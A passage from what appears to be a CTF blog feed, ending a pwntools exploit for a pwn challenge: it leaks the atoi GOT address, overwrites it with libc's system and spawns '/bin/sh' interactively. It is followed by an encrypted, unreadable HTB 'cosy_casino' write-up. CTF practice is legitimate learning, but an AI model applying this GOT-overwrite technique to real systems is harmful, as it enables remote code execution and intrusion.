p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">add</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'List count:'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    <span class="comment">#print(p.recvline())</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ow</span><span class="params">(listn,st,ed,text)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'List id:'</span>)</span><br><span class="line">    p.sendline(str(listn))</span><br><span class="line">    p.recvuntil(<span class="string">'Star id:'</span>)</span><br><span class="line">    p.sendline(str(st))</span><br><span class="line">    p.recvuntil(<span class="string">'End id:'</span>)</span><br><span class="line">    p.sendline(str(ed))</span><br><span class="line">    p.recvuntil(<span class="string">'New number:'</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(li,it)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'List id:'</span>)</span><br><span class="line">    p.sendline(str(li))</span><br><span class="line">    p.recvuntil(<span class="string">'Item id:'</span>)</span><br><span class="line">    p.sendline(str(it))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showall</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'5'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(li,it,text)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'List id:'</span>)</span><br><span class="line">    p.sendline(str(li))</span><br><span class="line">    p.recvuntil(<span class="string">'Item id:'</span>)</span><br><span class="line">    p.sendline(str(it))</span><br><span class="line">    p.recvuntil(<span class="string">'New number:'</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line">p.recv()</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0</span>,<span class="string">'4'</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0</span>,<span class="string">'2'</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">1</span>,<span class="string">'3'</span>)</span><br><span class="line">showall()</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0</span>,<span class="string">'111111'</span>)</span><br><span class="line">ow(<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,str(<span class="number">1</span>))</span><br><span class="line">ow(<span class="number">0</span>,<span class="number">4</span>,<span class="number">4</span>,str(e.got[<span class="string">'atoi'</span>]))</span><br><span class="line">show(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Number:'</span>)</span><br><span class="line">addr=int(p.recvline())</span><br><span class="line">log.info(hex(addr))</span><br><span class="line">x=finder(<span class="string">'atoi'</span>,addr)</span><br><span class="line">debug()</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0</span>,str(x.dump(<span class="string">'system'</span>)))</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-cosy_casino-pwn-challenge-wp</title>
      <link href="/2021/12/03/cosy-casino-pwn-challenge-wp/"/>
      <url>/2021/12/03/cosy-casino-pwn-challenge-wp/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="634453b67a2dc9922f2f9067eb2e9faafb242fe779c69d53bfd6369318030d94">05f7089c65b602f54cf031d72ba324f293b950b9438ba0d2fd827b4331041d15e8674cc7493b8ea9e85ff9eb586cfcd56a1da5b355e3f45a7bc40f886778bb1c62db5c7980f7a359b8081f607cbc98b672299e4ab95bb42a9e574ce84ab73a186fd55f09e34cd89d707a86fea10ab928df695a9f8d04cf6bcefbc1e28270fbe8b4edddfa844c5e9dae131c44340af221f627810201d8400c4b621e3b2c9825dbe23524d9039e8d3a9a72a0ceeab452859df12c4f611ff81a8aef74551af8b293f12402ed3ea388dfe2e18da0a671a145c983f1909270dd4d81a11672c8dad8f6a01a94cc9818234042bfe8d8fc6e62afe9832679b497fb008b81ed49119a6d0bf3c23ea49f16b246f75bbedc9c654a5a2197d18f9514a82816947c84115d52de0676a958fba36ff4cc66d0cd997d489b931e1fc0b54827f64e711198e2f80c9f496310a043224c339ba2ae908d08e6ea103a34f7afe47c30aa3335a832c66d7c33cf45047caa816f71b56a4674eb11e913be1e83338ebe292601ef6acf9177f8ead2872f6799b597391a6c4c7b661771ee3bb1109de0b8edb558f87d8df34b103ee3aacda5301b20a0fe2ce03653c3475ea1524ce39dafe0b5b45dd20d03daaa47f83c67287b0261aa003040e3c3e94b4319586431a6bd0c771d23de1c178fa57a5bf06f72a10600d0af7943385a9dc1c172882c84f308ba01dbb2b0ee7c132b8587ae5fe04052b182b9296635d9a86ea7508f3601d383fd1a17323fc75b42787bc52e9b51da287c05f142ea53e6bfb4fa1ff7e5c77e68d1bb63034f98c82534a7a681bfbe3dea564b8d5fc7fc65b00b885a0d7111fb3ca4dd6c67d0dd6e7c433796d5df6e988fc20086e1523559a1da03659181537dac3ab40114cbb378d64c55dde352d0be0797a87a69e739e42a0cdcdaf5420b44de39a672f471eea5ad512a08fae09f70e51f31c06e9e6a6ad7cbc955a852d623a24e0ab90c053e90bbf7082155abda9e4323099e8c5d48f9d5c9a9b3d67f69d8b02f5f892053256d8edb05d1b0ed4e212b9b5c06845eba66a0d60fc8c749369ad37fce51b644a4e93fe8c73130dfbb4ae82a5e23b2d306d358bc03a813b1c4712d298f56316b43406ba3eb682657ef04ab455e886315df9f0dacf0d5d12dacb35881d05424f6dc3983a28aa105e195a764ab301e42602f8bf7230a35e7d51a194d909d612964a5bb470e89c29e564011c66e48480bc55624bf326bdae148cf21786f1c60c62f8fb4807924bbd1d7a62b01023ec5677adab59ad9f69da34525c64923ac23b69c486d0ce6c617799f4d4620d28d5b5f5a96ba674cd68391baeb5398bf2162c654869fab313fb7ebc5526a86ce87d1655545b79b91b6ff236e12d8d4926d1351f633f2f8027cb1fe8f3d75c4b93230951809e90adfe05d2a984ca1b1b1e01788a89aa38f02590217de0a8b6ac45fe95cdd13d92513bd54dd36c8c60a3aaaaadd9c08e7daeffd00e3d9c49f75065c565f7cfeebddcad1a191a016d1a985416398c94f76c6adbf5a57268cef90709eb490727380ebaaec3a8fe4c0eec6f9a6bef27a185a694c69077c74bd89634832edb380310e831d260d15a7aaa4d8a1b579abedf89d0a06b0715178eabfd72565f350c8315d8b3446c977158d77cc7c23043d5bd87428e70bb70ef8f9e09413a2eb9fa272bb8b32a2645a07a9386ca570e98a9ad6c4e315f6afde7cdd9ae2affaa096299f868f890f648a81d1c0832bd2ede9ad00d85c4f09c0dcd932b7cd1bd5582c7bd7ec7feab4b463f78702d9d7effd46c762b6ada3841580a599ff7c50790f74fd62c1857ca8eaeddf89894b9824e75f2353d86b20a3b000b80cf9e8ae4429114e8fdaa74eb06f85191de87b95b09f19093a50142e80c3f1397a8ce7e1db576f59dff8d7cd8951a953f78c51637cdcfd3f33c5872095883fd3508690a1a9f449aac61ed52aa811d0e9cd6d03ec6e574040aaddef0cecdb095244d8e319c2cc3ca25d5bdbb765727e24ddfd3259f9fe7b5594823d4909ae54c05f7cfd70416cb9c77a9f0a57f14470e1149db56cb9eaa94a70068d9117b0cbd8aa7ddb55ffe619d184bef7bbb096a82e43139c37aef38d0f1a5ca1760391bee95000ea2188c29b8990525a1f219608b9aa00640de79fe643a4cf845210f422f4d871d6616f01b8882374e0d32c3ed30fe53bc00b91cf2973921cff0ad34d1e3e6ea3b9473323fdfb7ae2f90fe089d3346c655d50185ad745f6d9a11177de431211bb4895179eb1e2419b9612c635b041b79886e55b83ff1a6f47539bbc05bd83de64ceb98d1957badee40c7e5b6f452dc2e49f5d7386655e209cf31e312c16929c36d12aff05fd85f03c37339721c80dc52988647fd90f13d6a78ac9467b047be3f3ca4cdac4d8af708db42a5cdff978e67d663b713a15ed62c80634cc560e337980f7c5c55f1605f6014b1f6bdb8abb47c1547c45ad0b1a3c076a7e9bbf74bbf494e69f7036d4a9bb83d3948275c4999889d92cd69272fa2a6fde34d73dc5fe7ccbf53da88871915d89af4b199efc657f11eb011973c00e8997433a8d5eb1499f73768b8c6e54a661d6cf96b2e8626131069a1757c3cfc296a3d46ed9c5e83a6d68392d3f4719d23d1f0be7ae39d50d4c96fe28c94b5c9d056153348f14ef47cec5bb35f53bb92d067c473d80a409cb4efa5f72d029cd6cc02a1f517360ebaaf2286e8828ea1a47e1dee76993d5905e04251aca4274dc5da169ff26086b2f50f8769991bf57eb7c8b5fc47141be7b856b0a06a8be99d7087895307f89c5ce1e583bbb9cd28929e63db83bf192528329e5bb4a69a6e6082ec9ff8e20c622912691d2e8257bac11378258dfed8da39e70a2ad3ebd87581304433c8365787eca427f30e8a52c748004ce2d7d44417b123bea4b6e6f7c185abcd213ee048b0b2ed6053f27ec3bc3d8cbaad5cce7ffb1f0056dbb675c1699b50e3ff382c776f3f16295b9d1034ce8f13c95a0411459f3d2942325d200ae2f8f4d46b05d403af6dd4e0b8e42da57fefc38b949e516d52c73c97e2ed67cab7d4449f4c2eed2cce64ccbc3473cda2b03d8ad390f1d41a8b79c32e24079128ec645871e57afcbd5c58d29c159bd9fcddef4199c61f4c20b97cb0bffc219af6fdb87ea3125dfecefc1f23df3d4f196ec04592316e4075b015de2357a562527b198f73ed31051b4cf6c2026ad3bd271464df858b34f2e14507427fef7470c4c84712d371ebba249bcb51d0c946d371d1f03c3ffbc07760e135373959a1e5c443d1d82480148923005463de9030a031035f350a2bd00b4caaaa6a0a8604555b577b128c513809cb13735aad0471f67bbd718a9ae1ef8e9770d117b740276f60f94abc3fbe4609363bd0edbc94cd7ad9878935be7dfbaf07d1fa9d4b14abaa23a85207b491003a753d2b8e74f9b933a632feb74a78751071503970ba028f124088fabe097d7b3d27b99536657cb9e25a2fa6d41a0978440e0a71ba83352473605c325799e66f2942df610175a24260c82b54671f1a29f844f44a1fb9e2536c32dca5bbc311f03d6caa43ec6c98c9c0cf9eebcf2e458951249a3ad0709f6aabfb53c90cc1a2f339ed617e96c3f055de3eef8922686f23412e2a3d7acdf99fcacf254addfdf32635d2ae71e82496382bcbca46e6feb15e55f2018a13fff7d41722f74198fff4f74e3d3bff78db30337511bd7bd4c9104fc5e3d4cb2d0b5eeeaa31d5b6a16b9b2461b6d92ffeb11512aaadb780ee6d79ce9e2702141b2da7fce9dcc6f0fbd7a0679f4c8e948d3ce378ffb0fd1b98ddf6f53a5b8ae9ae5e5237e7760997ccd952e842050ef284d76e5c68c1634743eefc3df85111589e98559bbe443f6778b6ee9b532f0766d48cc09fabc8e7ee5419d025d3d627fb3a3cd954dd70b44c3233cd9820a60d33970927b585f484714d37ebab5641c70c766ecb72f0d8b105c18348a6e3fe5c225321070a50efd6775800b7dd6d717defd3f1736786452d65df45dda9a28e8681192b32f5abad22c8b682f5ea29d7b635538437e370a88432eff6b4e70df8345605cff1c6da340c0512fdedf434b7795814be89abfccae3b7f592a4bf80f36f3f31ad905e4dbe333f83fefb5a0474179340f65a64f0d8c6cbcd3bda37ad962b0938dc35f69ea0b55a61fdd89b52f94da31accfe511e68a7bcdc95c57de147b35034e008e29c032be8cc6afcc4c116b2d4252e2fcfe1a96550bfd3d6d7c07fa067aaefc1809d1150fbe76e949b9732a84c66d1e23b9cd9c0f5220e1de2be6e7f4ead4e81b68d40d4b2821aafac5af1feca7aaf94eaaa4781ebfacadf15c15700c9dd8e26abd1627f238604295e0039e7dab5b8f7f100e65eac206a652c141f794dc4c0c025254d5f9475d3646507c61ea754ff51af71d35287e3f65213f5b7a44c88acec23c89d898eb8909184ffa893fa5c93a3816e082bba057fc0d0a7ef37116c4e52b20b7a41caf0222cbe3f621af51d8808f1ddd17e9e456d69c2d0405aa9bc8aa3c9191297e52fe3ba6990035b520b6a3c3438992201e7923f96c24aacf4beea4dd699482adb51cfbb31baabb3a81f187088eef09b612fedb18a52cfb136a7d90b48913ed5279a4d3db662896defe12a9a20b0759b91e0b1e260478d2c220e255cb5b28c4c7f37b579b5940a13cfdc45734b77ee30826a46a05d086682c70ee0ab850646a5ac44e58adc537c23eced9a86cfaeb891152e71a0f6f323a2dcb4d5a45d957b9bdf63c8cfa57a0e6bc109e430780d28a0301f83bebc4f61bf56a83bd4581145d59c1e1ceefe2294db562a1bc09b3afb5f4d8464c3d5048569ee67c0066b2ee6d689864a5c6711fe4a4bd59380602e589797594af213f0d47fbf4e26a3f29f82f8f4bc2b52d70812534a81264e1afcfd0f7374308bd118020b7b3c81095849a03d91f08808facba9e6b74873e4ad6468d67e3aa19f622dce9ff650629f61c019c933c8ba8940171e324735a70a4235a200dd045f011a533e007a5a5c16d902e82bcfa8d5857e0d11b37a71c1e9adf87a9136b023e0b21cf6fd66eb4d95d465806abb2e01a2c738df553710d72fff00d32aac83a3c82465b0446c5cd3cd1797e15eedec1a32d9737b1e019744310d800895220da67ec87bb244c4cd9a7bf97b8d11de1145579e2aa5d8205e19058c134ac60a253017b3ab68facb5b86167945bef443cb6b9c0c3f47e6440a864b7928ee031565bb3639abe53f0e5160be0988769f83ace3bcec14b718376ecd1e29581a239d22630a3c97ea0fafebe528147b0cf97776d3e0bd1ff841f65e510100f177d6fb96252311b8e0524ec522a8ae4208faa59fae8375a8a81fc2647c2dc90cc200c37c084dc9ea70fdaaeb9f92642412dc1f364e738f7628934eb25cab1557ab5ac7dbfe473c4b6c3f390b1d9de3cd9009748f48a753e4343c5691ccf3dd08c434e0d41588b960163736441c9f51b9bc7c4516ce60ac12bbb8cf6077c4ef19aaaf1ee85ce2b877ca8ee7681d47dafc9d50ab4b8143b530fbf7710d6f40f4a7e47b00cd34d9dc7d9b24fffa6c26004622c9b8748f9077e54707f994942b023285f4163080eace611fdc365650d8f09b135d782c96f58b25870eb33fc6efa51f12cefcb9fc4b98b8e8b054cba7a86008020d393918dc262491697258580e05aaba7bb5bb09dd33a455436c6c6ca11a09cf58e3e5772c034c6a8946066f50afb201d27cb5b73761c259bb6599e9d5cc433c979f434e799cb12dc90fe0ac7883010b11ab1a3794e4a8d6a13530122b2de8a82c6b721da9ffdc8e7714d61feff58a84d298f68aa3005744d7b7f45fb11e5f9f5c6b80eb69e519b6b6074fd95196b796481d035dd99515e3dfb27e65c75a36c39e342d38f4560cd3268e7501e5bafb53f2346e9c338144f997c6ccb7200dfbc06da2c7e03ad0604b2c3b598da1e3c8c68fcd09f7072ba4d702132b0d789c6f40c95aae7cfcee7fa4fb3ec3362534bf5969db17a48a2e0acd3c42f82d8569ab4539ee5e54a382281192b0e379b219eeacf19feaf23d4107db5a1e84a42a979b8a05e989924788f85b3f14ae05689674cba8afec241f19b96079a1c2fd3ac87c35384eed641ad8a33f259b4a57344513790a5dd728489632e21aec9756587e1c2dd0ee494e87e823306fab6a423eb7543ddf92d72436d5454d5cbc0173380e26d78225d4183a84071dfac79a13f1bc14faab3c49220e219d3e6d4d16f71739e41bc19ddf64372971f4f4cce1a46acb66ab92fb251a191341fab304a15ff305e7678a275cf0f6973c1038306daf568f02136ae99f27e9cac76cbaf5a3a4953573e6c25ce9bda089879b042a2111f8272b56d5ceb36b20523505990a2f43823448329067f237bd61c0457129a769ffe001ce50f4bba4111b79951f08171be7948629df0c3bab3ba1523b18e8ab7e7c4dce10b92fc2f720502709eede512ee59cca7700aa30900f2be52f4c3611ef0f2de68ad7077c4461a4eddbdab0b2eea712f7e6f10ce99a47ca5bd3a5b8bfd016c391212151be2843b770be4322a236b21dda1dff96cedfb885bc6c4673a5952a616dce6a497421e254024d77deb029a308a2033971ea071c1f394d80ea5a1e5b17305dc07e7b7d4cf1ca0a6df468cd69a3c99ded04b9626e8b9a65faa58ac4981b54049cd49701e03f2dbacdfd099b4413f0fba95ba8b9be80115c231ea21787354fbf16e18c4af35b7475455fb217d907828df0a3c9bb23abf118b611daa5057bc992e61deaf2a199a5e059e064d11e302b74df22230b93b1632cda76e4faff1facfd93510aee70d809e52341961aaf1e47665cfab600976d9a6f29f25dcacc4e081dc862fe7fbdbe6d9b32481a87fb9e7266b98e7af5969d2bdb71986f72ae5930df446bc0abfe3541b60e552f6ad29ef3fd773a3d85bbbe8dc9e91846beebe5f5654fa168ef8d7c330e3ed14c60190592f8da5980225757e9973b61b917215c3800b3b396fd4c873be597758bcf40a8dda38713dad66af3008717524d3070ff9b900eba89abc2855342603870974a93d766d74f8ab6a7103573648230862384c9b8f027a47fa46fb2430c47d5272368a2547db90e1cc6a02311a96519d192dfb83fd5c606a60492fbe23c044c65115e343ef8847bd2ee39a3d43759f87bd9186ffd98c9524d448c63909d03264c51d71d847c9c65a4e0ea7af9d40c7ab74faf1e00debc937e40e37f9a9af3d1e03a34045c182d0bf6c42dc69289f27072221622497bc965d648abb3db2bc4b066bcf831c6a86c18bba2bdd84c655b4a4af901477576a2b5024be3068c9f25c001f21ed967c46297aacbfb0e327fede66315c3de1e8ae021385fe9a2a57c6eae45d27a1ba96a9d84aac1f1450acfae83ab9e7c92d1db9529abc507e72ec0ec755a43ac6e3c0919d847b0cdd253be7a1d83f99f7cc95862389dcb2e5b0c9ec9491eeafbef7b87b6a625cea7f9de6205d85af01ae8474600b181a54e786164283b02c1c5470d24f6608001368dcc5496f53aa4886eedf625205d52bf74499c2ae13eca8d16ac74272d7860f923c730b78e90854f39c757f1df6a38f05f5277a3200382e238e77eab3931c41df58188e0b8a930ef104bf227d521e12c071c77c379005e7c0635c0a6a007de22b73cf111a1d70947c6f5be82c16ae292c5e8689e1f0baf309e1691c10e16dadafca79b18dfc54ad830440928758e70600c546147c6fc3ef8c21d1847f4e483714ae636dbfe721d8883a904663278b106364585f0baf6b6ed36d15251750c2c322b10daf3a782f8a9793f04b759cb01345e1737359aa556e111911cb74c4dc8050db606cbe093e4d47691b82f6a9eb7d48203dc574e830ac1de4f29b44c9d88d4fe27358e9a9b7473100fadeec6c9f36916b82a33614fe033ad6937a30f35333bfb13604b37adb0a0d19a941d6921944b42bea96dc443189a9535d0465f61e01cdaac340687e198378ecad9d5ee243714d8fb6d521379673a2ca4413dd73fb5296c3e8b2cabfe65ba7ed18db357333e1a1447fb5ba6887eb4747388ce9cb6f3cc2852f8d95340e7dd3851b4bcf52e3eaa476dd0a38427432867b4a54a12771f33aff5855412666d618a64f7937c39c5766c9385e2d36b2ccc4892cd1833a575d0c6c84f8b536319485bd1ff387ac86a811986a83b11471cc3ebd3d087ac2a082d5392ef1a43028a762608af490a9d531ebd405cb72208630968b4f77016c295ea2bb214639155029a6293cada09c8c394bdfa8640a1d45f4a1fb854884ed016f174e4c7f8e4712f203c5cdeaa727ab48213a875f622e449ea3ec440078758e2d0038499513fe5953267a632cc8302c907a458c6e09d07990576ca131e72ab5c901874b6e3110cda4ee5acf0211438b31816df9ea3df11ca58e7bccff340713fee60e5805fe08b26c7096ea373d7de3a990e3f3d7e1db260fde6332133c328510da3ed5f8d17138b7416780db7f47fa120a6f34472816720f5e6bdee93aceb39d04a41b8fbd29be8f602aba0641e9e894514c5c1dc90b4713378cb2486d3aed8f2d114335a887e8902506a291505ed3fd1e5af61f306b3bbb768b658f0e6e73651f39f206608b9f55033e80c1b1d25a60653af0259d0322b1d9c3bacd5d28aa252227188860acd7c63e6d17e5f1bbac99b7a0460590e55feb81b77e3f68c0b37ba2c8d60fc5a66bc78188d9c7283f14c404d62125941cfec53272631ab172faba2c6c5fc6a7e4f2c868d70993f1195e7f4c1d96c9da69d9186000a71ed152d8fa5558ea438fc6a9ce6bba91d012069590efa3e6ed9cf71426bfdf623200fda36f4141ba29128c32a9f8e2d254504b2a25be4ee991dc1201a385ea7b6c55a33f54caba59a542708ad5792b1290ecab885703abc041223ec4c4ec1e73652255596e39c7e61284a90a97a3309ccce0ef6e0c33e86e60e635a8fb75718d5f50cfdca74db89fb8226bf49ee4740fdb38133f005647f40a12bcb7ac2ff1af6d540b1be4d89e77cc59ce30252e6e8931d805a7e23797786164e933bd0bba2d59379c29994839509c7d761d2b47b38d86c01d49ccf5951b506c6bf1d12433860466d7cb063aeb243476d1af76f702f8530cc041cf55cd115808130b5724b50374bbee1a219416651f851b0d72120c3041bc320a8b00e3bdb60b5ae92b6fada4cf785b9ed8f8903eb1af411400e30b94b870ca22d8f5158ea2c67e48ac69c6ed192132203ee98e12a715b60eeffb03315ede03310ba3bd0d7d43577734309759170fdbada0624b737b7df1630406a27e312aaf0d31a398830fd5ad0e224f602ac962fc5af5595719a7f4d730b2f33f9b8b18d2797cf42785a75f09b7515f8db371f47f3bc973cb8b86604b283a084abd7bbf0ff3fc754b2340cd0dcfcc23ff026a7623d07d5e3e712aace803281b05ec6c40108a69597b49207e470ad0e05d008a34b2736d7c7e5b6a41fec8b21fb363d5a993b999e4c0e5a65927d342bbc1fae27de7329f84069830b700b371be5f2bbfb6461c460282cb4fbdda033dcdb097a9b62ddd3b2bf3152b0b063653ab11d45ab6d47505ef8026746b599641b6745b74e9b53025bf96e8cb972cf7bb06565bdfb1daa7352228dc43b88740be8419f288178835faf6473d431f29a21defe3c458cb6da7fb1707bc6973e2d7d7c691fbef979621aa20534a0e2448fe2337d32170b1889c18769345c93a5807a5fadad322bdbf68fcda260083ecd8e44a42d01ac3f4727ece95789b16f19256c51adc267589fe6640e2889366038e0cd3d8bb47630f61dd0952275b0f38bc7188fd2a282cb2b16dba2bd789940874b532ad9117467b9873f8531b7af70d0ce7ae6e80cbe5ba7923b32ae0306f90012781149b0a5bff70b10af0e018b8590d277397f5379679774738078c4a2be4170cf8d031a21cd5cc7adfe5f03a29c6822bd65d0ea2390399368fa61fceebf3b5e976e27d724c5e6a9c30f39680415790c3aeaeb22bdf4b09316728b7bdca6fe0c11672d661999e385ea49222b32bfb7afbff3a1bd75823e351f192ace04fd95770b22ed31913a2cb60b5fee7819f5ce3c84b99097d759f9d2c8c1e6bd4ec56c3edae175f6581f16cd3b287683e355f09c859459e076815a7263d7f6300cc6f7abff717266f4fc937e9a5ea835f83c480455a9b0aae65ed547d58affb8522c6c163200fce715fdacd21f39619be20f819e7bc39d0aa38938945d8f2d6f2ccc714aad3c68ed0643fe3d28af35b113c5cd679d456a494cea7b61dbce8f5b2d0f707b45a055ba885fa271ddfacc16d1256a50033abfb30131a257efc8971127a58f245c6b700d619f1bdb71e09e4ed417955f0e9966b50de7e1b263e2738c790bbb23acc9b7e6129702b63e8577e234ec2e93e35f87ea65b387f909056ae60c6c2df50b9559143779a7f00613d138696a0f8f9b43b0dca0e2f7969dca448e2e4087723842d92e2cddea317396b065609c8e1f4edd62a8ea01529647410f662603aaed907f84531be657870cb7b6e6bcacfbca4d7894c0b1085822679fd4eb133266babc1ae5ce94558f0f77aa27f919a28c566b0e7509eb1fda4dc72810ff9727dd8f334177c6f6e9a728258008d45680bffa0f152aa7fd0efe79eccf2fec8d39363e9e3e7f87dbb4c8009a9943d89556a8eaed96b914fcc64d87e7fd01962700c152d6e141a21b305b3e98f00312c2a81676ae9f1ce4120d805a024351a4c3faff46f10053ede3c006dfa65a188fc612a2137515f52db4cd4ae53a933a69b7936eefd1f8bc72136178aac34c159649138452d4dc32952322bca52df7af6924ac1f12a0ffaa79e61024571972c514b539b225b3b3ba4a8cec74eb26467c70dca08e4f166f28244f58d75633f330d2a7a2353b9db0301f788284644a441f7e6d8736705ca60edbf2dff9aff420d1b652a3e0a5ff3bf96dce666504d381dd678caf87873696395239653f107354175929ba633d4d2e7732c44e65c8e071fcd723a388567813c3fd989925af5dea6112fc5fb7250c6c12c2cd936833d13a275aa4de3e576f196ea59882750df6c1285385bc422c34df8b1757846d27dc5945c43a692d9bb4256d105771949466558e4598db7246e4e641226c8975ec51af870594fdb441eab537cee9ecf6e62146388282a75657f4b469b947464b19d31644c2c93487c239e5b07518750346aa65e4c7bb28dc27ea7bcf759b351b0b94ec35618e7c4df4995de3e6a08fb9e677ac28cb53a9c4596b8c6558408f1b54204eeb5b16ee92750a1d1920b20e1b411d220e017e68a4363f279174b501cd8415fd4a0fcabb0a5bf530db900dc1c536510dba2cd20dd274bb72843394c59f1a336d6e050fab2e8cd19595cb51ffc4d580a5eeee3a6c7bcedd9641347a79693ac593073f400d21dcddccb80ecccaea2c7f00aa26500748a661e65d7fa0720b687ea6fd2229ed3b7201b2a5d243d22da1fd3a4d5754566ef8b632bc988402d903b2410c9f936d710f569ba37d92d0b8342c167ae8ca5797aac596738c7ce0081356f37b4e62821c602970bb7d868168041be4c263f832ef5e7516a0fbbdbd39f9ecf8907ab714b6e52b9ed226054afdd8c13b8044c227dd4d40e65dd11c1b675e8bb8143b5755f26a48453db4677417b87822dcdcad170d3b36164db7a99d02201c0805d87d327201dc9def9ea47ee97768339ee9c0a098a43f6c585d4337aca3fff9251031d9df2b74ae136832cb76bce240024f497843f53c8d7bf7a803d8d53e95cf7b0bd2f67a830909ed2cba04ae07c9492139d7dd3f58ef7612465f4bc007c0e62b5a75cfbafae6726b87ef4b2f361cab86d2310dd4730508d87eee347736c925262581266a2cfde20dd8783295caba1cb94ea7dafdee7b4241ad2a9bd6a8b151d124ffd2c7820d525c006f7b663ac27c98ad844c7ea47275018a41533935cc9881d637dd44264c159fbcb73a306633ff3ed9467449bc3df3f3fe2581228f9592e101ac2eb98dcf38f2450fdeef8cd443eae9f9fa3f807556c5fd2c6915b56f3b53be5bf568e014fd1f5ed11057b5dbd4250771f495803c2ad7398ad7bd3b6bf81ed98c91cbc7d6fd564ff4c83b27c4ad549ec07a97c25ebae72655633e79e9d0c8b75e343f603e9d8b59f411310b3af22d70db37cc31843d20584aaf6c4da6e7fde4ad982b768daba5b2af2971a926a66fd1eee01f7a0df6c46d072f6c580dde789ca58374678e818b45763a15e4df5c2433e1ac245cb847391ac546447feb77a84b94dd29ff3c79d0729fc60783f584848facee82036d136980ec702d079cb5e6d4341cc0f6c84eaa90c066721c74d235f40a165bbd5f999cf825777b2bc63615cf7dc32f923cfe72e7b0a116f7388613fee0fc6dc7fa58025dbd0b7ea139e8a145dd88fcaeaf88a8a1bd07d60d2982de8c84661c73bbea6f81c9e351f0f253e4afd43a126029176b62a0829ef538b9926e22a125a615f8815514ec5523541861709daf23f38f338e172da0124441a6d95f6dc2fd75f1926d2f06d1549078e13cd1d3a0147af0201fa8296d8b2b2cc0513b8c54ce72b352e6b71dd90883afe98b6573a871d395d1bdab59942f5bb345b8a449ad5c0e91d6332be7881edb89d154c531b18db4dbde8e7124631aefa8850a27c4f157bb067f8e6dd6b3ef9d4c490a70272d43695f0727d0287ef5c8a7596f5b4be1852e2beff49abae50cb2bcc838fbb59a2b69cb725e1f9ff941e08c9badf772abbe1f418bb7576c4adb224718fdc58c8b5598fb3aa3c8c773123b03bb6fe241ed2f141e0d352c899eb48ebbb5ac8b60c7bd47fd9ecfed96a227f9b1490986d3b32975b36133bc6a08304e8d6ca174ea1f8bfed0a384a9af46448e2e004ac44d8101c4e7d2ebf6fa548c43092a169e6778f4c9d2be1cb38e08e1689e926399e7a05f8254a43693fa555bf1facf0e7c24e1140a8298ea7a6b5d8dd7f85a3df36aad1740682653704cb15e3220d6ab29c5cd668842775ca8fd672e5ebbf3d9997d36be4ee02df6f5f90a3178284789de1105f545f6af55dde34ef9d3950ff186ecd4ebadb18569d963bf31d0ced77d4cccd217705d110c7d8f06068b90c31bd332b2ae5b3e7cf5e1dbbc984c4a5f8611d52ff8baf4b925fb2fb7fafedd0bdc43aa0297de4a6eabc1b81f4d8684585e3e2ec3f02e4182a8e00845846bc9e5fa6e7be9dd3174a219fc8fc75c0d1c0652ec9c34b939cc381e9d09d38e75b34ee09e018a60aee45eabec7d995a1024ecc3c6f63ff1bceaa8053d3208b9e1bb805a0ebf661a61a902d2592012d9c60c5135a302b0d5772a040fa4f98d20bc626de2310933f86f4fe9c94db76462ded000773297b0bfcad55ef6c83ee5d20e5f170f37182f63873370372ec3453b3c206e9128b3b022d8c3d7cd327214653190bcd90c180fe65638e8849f77f6278ca1d0293c100dbce1af341bc1d524418c01c396ed260077d338c1baba9d8af1d2c8d5c77c2f2594728072fdaa212203aedf39b68c00b748059d5c226dfbc5ec7857b9bc9da63215d6ce959a3fa10abc00ede4964ccfb26131bc9284dda6ebc49291e441c85f7c30789bfe567fbdf0be9d086c7de6404bced56d2b4f8a5aa645417d04af73486abc0a24e5d23ab2980452a5d7edfe86c4823c9ecc7a90dbfe37c91d8249ad4391e4e4d3bf6b3983f69b41df8809f8c1510af84d4ce24e90e3764751ec05ae4d5f1e3578c49783d72152dce2990d690eb93fdf9b948e6de1fc427f1ffd797708148aa301ad9617a1b544736ae5acf7be48cc4070d2a03513685708ebd12085ecc76274270037a0080832b87f2f180d6c9455604bd368e40f976f1e0eb3592bb36332e1b3c013a299f9dbee2922f1f970352568c893e6401035fc0fdab9df721c67c4a0b1aaa80895595ac770f64a280508e2677cb